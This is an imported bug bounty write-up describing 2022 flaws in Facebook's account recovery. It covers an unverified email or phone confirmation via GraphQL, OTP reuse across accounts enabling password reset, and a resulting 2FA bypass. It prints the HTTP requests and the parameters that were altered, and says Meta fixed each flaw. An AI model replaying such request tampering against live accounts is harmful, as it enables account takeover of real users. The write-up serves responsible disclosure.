---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-21_0-click-facebook-account-takeover-and-two-factor-authentication-bypass.md
original_filename: 2022-12-21_0-click-facebook-account-takeover-and-two-factor-authentication-bypass.md
title: 0 click Facebook Account Takeover and Two-Factor Authentication Bypass
category: documents
detected_topics:
- mfa
- mobile-security
- command-injection
- otp
- graphql
tags:
- imported
- documents
- mfa
- mobile-security
- command-injection
- otp
- graphql
language: en
raw_sha256: 306bc077406f33a93d0ac40913bb7fec612fb8db2663dc992f3ebf5e18e1d6ab
text_sha256: dcb949aec7a931045f30314c8a3a294709b8a2054ff8c4d1b0f33fa5b11f0bf4
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: true
---

# 0 click Facebook Account Takeover and Two-Factor Authentication Bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-21_0-click-facebook-account-takeover-and-two-factor-authentication-bypass.md
- Source Type: markdown
- Detected Topics: mfa, mobile-security, command-injection, otp, graphql
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: True
- Raw SHA256: `306bc077406f33a93d0ac40913bb7fec612fb8db2663dc992f3ebf5e18e1d6ab`
- Text SHA256: `dcb949aec7a931045f30314c8a3a294709b8a2054ff8c4d1b0f33fa5b11f0bf4`


## Content

---
title: "0 click Facebook Account Takeover and Two-Factor Authentication Bypass"
url: "https://medium.com/@yaala/account-takeover-and-two-factor-authentication-bypass-de56ed41d7f9"
authors: ["abdellah yaala (@yaalaab)"]
programs: ["Meta / Facebook"]
bugs: ["Authentication bypass", "GraphQL", "Account takeover", "Android", "2FA / MFA bypass"]
bounty: "3,000"
publication_date: "2022-12-21"
added_date: "2022-12-23"
source: "pentester.land/writeups.json"
original_index: 1749
scraped_via: "browseros"
---

# 0 click Facebook Account Takeover and Two-Factor Authentication Bypass

0 click Facebook Account Takeover and Two-Factor Authentication Bypass
abdellah yaala
Follow
2 min read
·
Dec 21, 2022

172

4

In September I decided to search in recovery flow processes in web and mobile Facebook application.

When searching in https://www.facebook.com/recover/account/

I found a graphQL mutation that allows me to confirm a new email without having to prove ownership over it.

&variables={“input”:{“client_mutation_id”:”7",”actor_id”:”<actorid>”,”contactPoint”:”<youremi@fb.com>”,”cuid”:”<cuid>”}}&server_timestamps=true&doc_id=7719778831396560

I created a report and it was triaged.

Account Takeover

I switched to the android mobile application , while going through the Facebook’s password recovery flow using a phone number.

POST /recover_accounts HTTP/2
Host: b-graph.facebook.com

q=0XXXXXX

I noticed in response body there are a multiple parameters , I try to change parameter values from false to true one by one using burpsuite intercept, Started by the last one

“is_shared_phone_no_signal”:false

if set true , I notice that the next request has parameter shared_phone_number in body request

POST /cuid_[CUID]/recovery_codes HTTP/2
Host: b-graph.facebook.com

contactpoints=%5B%22%22%5D&device_id=1e4dfed2–6d97–4500-b73a-6f6a64699d27&src=&use_google_sms_retriever_content=true&client_rate_limiting_rejected_nonce=false&client_has_permission=false&shared_phone_number=0XXXXXXXX&password_reset_cp_nonce_recovery_flow=shared_phone_no_signal_account_recovery&should_use_flash_call=false&auto_conf_flow_type=&family_device_id=61e39cf8-ee26–4070-b14d-1007da3e5a18&locale=en_US&client_country_code=US&fb_api_req_friendly_name=accountRecoverySendConfirmationCode&fb_api_caller_class=SendConfirmationCodeHelper&api_key=***REDACTED***

I received 8 digit OTP code , I change CUID to another ,I got it from :

POST /recover_accounts HTTP/2
Host: b-graph.facebook.com

Get abdellah yaala’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

q=06XXXXX

My surprise when i received the same 8 digit OTP but in the second phone number. Tested with a different phone number (other account), I received the same code again without modifying the shared_phone_number value

To best understand the bug worked in following manner:

1- I put victim phone in shared_phone_number
2- CUID is my encrypted user ID
3- I received 8 digit OTP allow to change password of victim account

POST /cuid_[cuid-victim] HTTP/2
Host: b-graph.facebook.com

code=[8 digit OTP]&new_password=***REDACTED***

I quickly submitted the report , the report triaged Friday and fixed in Saturday

Confirm email Timeline:

September 13, 2022 — report sent
September 15, 2022 — triaged
September 19, 202 — bounty(3000$) rewarded before fixe

Account takeover Timeline:

September 16, 2022- report sent
September 16, 2022 — triaged
September 17, 2022 — fixed
December 15, 2022 - bounty rewarded

Two-Factor Authentication Bypass

I was thinking that the account takeover was limited to account not protected by 2FA. back to confirm email bug and while team investigating , I try to confirm my phone number in other account using the first bug

&variables={“input”:{“client_mutation_id”:”7",”actor_id”:”<actorid>”,”contactPoint”:”0XXXXXX”,”cuid”:”<cuid>”}}&server_timestamps=true&doc_id=7719778831396560

I used the graphql mutation when I was connected to the other account and i received notification that my phone was confirmed in another account , But my surprise the 2FA was disabled in my account

Additional impact sent to Meta Team.

September 22, 2022- additional impact sent
September 24, 2022- impact confirmed
September 28, 2022 — fixed
December 15, 2022 - bounty rewarded

Meta Team found no evidence of abuse After thorough investigation and internal follow-up

Thanks
